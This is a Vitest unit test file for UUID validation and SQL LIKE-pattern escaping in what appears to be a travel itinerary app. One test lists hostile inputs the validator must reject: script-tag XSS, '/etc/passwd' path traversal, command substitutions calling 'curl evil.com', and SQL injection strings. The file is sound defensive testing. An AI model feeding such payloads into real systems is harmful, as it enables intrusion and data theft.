/**
 * Unit Tests for Security Validation Utilities
 * Tests CRIT-3 (UUID validation) and CRIT-4 (LIKE pattern escaping)
 */

import { describe, it, expect } from 'vitest';
import { 
  isValidUUID, 
  validateAndSanitizeUUID, 
  escapeLikePattern 
} from '@/lib/utils/validation';

describe('Security Validation Utilities', () => {
  describe('CRIT-3: UUID Validation (Open Redirect Protection)', () => {
    describe('isValidUUID', () => {
      it('should accept valid UUIDs', () => {
        const validUUIDs = [
          '550e8400-e29b-41d4-a716-446655440000',
          '6ba7b810-9dad-11d1-80b4-00c04fd430c8',
          '00000000-0000-0000-0000-000000000000',
          'a3bb189e-8bf9-3888-9912-ace4e6543002',
          'A3BB189E-8BF9-3888-9912-ACE4E6543002', // uppercase
          'a3bb189e-8bf9-3888-9912-ace4e6543002', // lowercase
        ];

        validUUIDs.forEach(uuid => {
          expect(isValidUUID(uuid)).toBe(true);
        });
      });

      it('should reject invalid UUIDs', () => {
        const invalidInputs = [
          'not-a-uuid',
          '550e8400-e29b-41d4-a716',  // too short
          '550e8400-e29b-41d4-a716-446655440000-extra', // too long
          '550e8400e29b41d4a716446655440000', // missing dashes
          '550e8400-e29b-41d4-a716-44665544000g', // invalid character
          '', // empty string
          '   ', // whitespace
          null,
          undefined,
          123,
          {},
          [],
        ];

        invalidInputs.forEach(input => {
          expect(isValidUUID(input)).toBe(false);
        });
      });

      it('should reject malicious inputs (XSS, path traversal)', () => {
        const maliciousInputs = [
          '<script>alert(1)</script>',
          '../../etc/passwd',
          '../../../../../../../etc/passwd',
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>',
          '%3Cscript%3Ealert(1)%3C%2Fscript%3E', // URL encoded XSS
          '$(curl evil.com)',
          '`curl evil.com`',
          '; DROP TABLE users;--',
          "' OR '1'='1",
        ];

        maliciousInputs.forEach(input => {
          expect(isValidUUID(input)).toBe(false);
        });
      });

      it('should handle UUID with different case sensitivity', () => {
        const uuid = '550e8400-e29b-41d4-a716-446655440000';
        expect(isValidUUID(uuid.toLowerCase())).toBe(true);
        expect(isValidUUID(uuid.toUpperCase())).toBe(true);
        expect(isValidUUID('550E8400-E29B-41D4-A716-446655440000')).toBe(true);
      });
    });

    describe('validateAndSanitizeUUID', () => {
      it('should return valid UUIDs', () => {
        const uuid = '550e8400-e29b-41d4-a716-446655440000';
        expect(validateAndSanitizeUUID(uuid)).toBe(uuid);
      });

      it('should return null for invalid inputs', () => {
        expect(validateAndSanitizeUUID('not-a-uuid')).toBeNull();
        expect(validateAndSanitizeUUID('<script>alert(1)</script>')).toBeNull();
        expect(validateAndSanitizeUUID(null)).toBeNull();
        expect(validateAndSanitizeUUID(undefined)).toBeNull();
        expect(validateAndSanitizeUUID(123)).toBeNull();
      });
    });
  });

  describe('CRIT-4: LIKE Pattern Escaping (SQL Injection Protection)', () => {
    describe('escapeLikePattern', () => {
      it('should escape % wildcard', () => {
        expect(escapeLikePattern('100%')).toBe('100\\%');
        expect(escapeLikePattern('%')).toBe('\\%');
        expect(escapeLikePattern('%%')).toBe('\\%\\%');
        expect(escapeLikePattern('Paris%')).toBe('Paris\\%');
        expect(escapeLikePattern('%Paris')).toBe('\\%Paris');
        expect(escapeLikePattern('%Paris%')).toBe('\\%Paris\\%');
      });

      it('should escape _ wildcard', () => {
        expect(escapeLikePattern('test_name')).toBe('test\\_name');
        expect(escapeLikePattern('_')).toBe('\\_');
        expect(escapeLikePattern('__')).toBe('\\_\\_');
        expect(escapeLikePattern('file_name_test')).toBe('file\\_name\\_test');
      });

      it('should escape \\ backslash', () => {
        expect(escapeLikePattern('path\\to\\file')).toBe('path\\\\to\\\\file');
        expect(escapeLikePattern('\\')).toBe('\\\\');
        expect(escapeLikePattern('\\\\')).toBe('\\\\\\\\');
      });

      it('should escape multiple special characters', () => {
        expect(escapeLikePattern('%_test_%')).toBe('\\%\\_test\\_\\%');
        expect(escapeLikePattern('%_\\')).toBe('\\%\\_\\\\');
        expect(escapeLikePattern('100%_off')).toBe('100\\%\\_off');
      });

      it('should not affect normal strings', () => {
        expect(escapeLikePattern('Paris')).toBe('Paris');
        expect(escapeLikePattern('New York')).toBe('New York');
        expect(escapeLikePattern('Tokyo123')).toBe('Tokyo123');
        expect(escapeLikePattern('San-Francisco')).toBe('San-Francisco');
        expect(escapeLikePattern('México')).toBe('México');
      });

      it('should handle empty and whitespace strings', () => {
        expect(escapeLikePattern('')).toBe('');
        expect(escapeLikePattern(' ')).toBe(' ');
        expect(escapeLikePattern('   ')).toBe('   ');
      });

      it('should prevent LIKE injection attacks', () => {
        // Attack: Match all destinations
        const allMatch = '%';
        const escaped = escapeLikePattern(allMatch);
        expect(escaped).toBe('\\%');
        // After escaping, '%' becomes literal and won't match all

        // Attack: Single character wildcard
        const singleWildcard = '_';
        const escapedSingle = escapeLikePattern(singleWildcard);
        expect(escapedSingle).toBe('\\_');
        // After escaping, '_' becomes literal

        // Complex attack
        const complexAttack = '%_%_%';
        const escapedComplex = escapeLikePattern(complexAttack);
        expect(escapedComplex).toBe('\\%\\_\\%\\_\\%');
      });

      it('should handle real-world destination names', () => {
        expect(escapeLikePattern("St. John's")).toBe("St. John's");
        expect(escapeLikePattern("Côte d'Ivoire")).toBe("Côte d'Ivoire");
        expect(escapeLikePattern("São Paulo")).toBe("São Paulo");
        expect(escapeLikePattern("Zürich")).toBe("Zürich");
      });
    });
  });

  describe('Integration: UUID Validation in Auth Flow', () => {
    it('should validate itineraryId correctly in auth scenarios', () => {
      // Scenario 1: Normal auth flow with valid itinerary
      const validItineraryId = '550e8400-e29b-41d4-a716-446655440000';
      const validated = isValidUUID(validItineraryId) ? validItineraryId : null;
      expect(validated).toBe(validItineraryId);

      // Scenario 2: Auth flow with malicious input
      const maliciousInput = '<script>alert(1)</script>';
      const validatedMalicious = isValidUUID(maliciousInput) ? maliciousInput : null;
      expect(validatedMalicious).toBeNull();

      // Scenario 3: Auth flow with path traversal attempt
      const pathTraversal = '../../etc/passwd';
      const validatedPath = isValidUUID(pathTraversal) ? pathTraversal : null;
      expect(validatedPath).toBeNull();

      // Scenario 4: Auth flow with no itineraryId
      const noId = null;
      const validatedNoId = isValidUUID(noId) ? noId : null;
      expect(validatedNoId).toBeNull();
    });
  });

  describe('Integration: LIKE Pattern Escaping in Search', () => {
    it('should safely construct search patterns', () => {
      // Scenario 1: Normal search
      const destination = 'Paris';
      const pattern = `%${escapeLikePattern(destination)}%`;
      expect(pattern).toBe('%Paris%');

      // Scenario 2: Search with wildcard attempt
      const wildcardAttempt = '%';
      const escapedPattern = `%${escapeLikePattern(wildcardAttempt)}%`;
      expect(escapedPattern).toBe('%\\%%');
      // This will search for literal '%' character, not match all

      // Scenario 3: Search with special characters
      const specialSearch = '100%_off';
      const specialPattern = `%${escapeLikePattern(specialSearch)}%`;
      expect(specialPattern).toBe('%100\\%\\_off%');

      // Scenario 4: Empty search
      const emptySearch = '';
      const emptyPattern = `%${escapeLikePattern(emptySearch)}%`;
      expect(emptyPattern).toBe('%%');
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should handle very long strings efficiently', () => {
      const longString = 'a'.repeat(10000);
      expect(() => escapeLikePattern(longString)).not.toThrow();
      expect(escapeLikePattern(longString).length).toBe(10000);
    });

    it('should handle strings with many special characters', () => {
      const specialString = '%_'.repeat(1000);
      const escaped = escapeLikePattern(specialString);
      expect(escaped).toBe('\\%\\_'.repeat(1000));
    });

    it('should handle unicode characters correctly', () => {
      const unicodeString = '日本🗾東京🗼';
      expect(escapeLikePattern(unicodeString)).toBe('日本🗾東京🗼');
    });

    it('should be idempotent for normal strings (without special chars)', () => {
      const normal = 'Paris';
      // For strings without special characters, the function is idempotent
      expect(escapeLikePattern(normal)).toBe(normal);
      expect(escapeLikePattern(escapeLikePattern(normal))).toBe(normal);
      
      // But for strings with special chars, escaping twice adds more escapes
      const withSpecial = 'test%';
      expect(escapeLikePattern(withSpecial)).toBe('test\\%');
      expect(escapeLikePattern(escapeLikePattern(withSpecial))).toBe('test\\\\\\%');
    });
  });
});

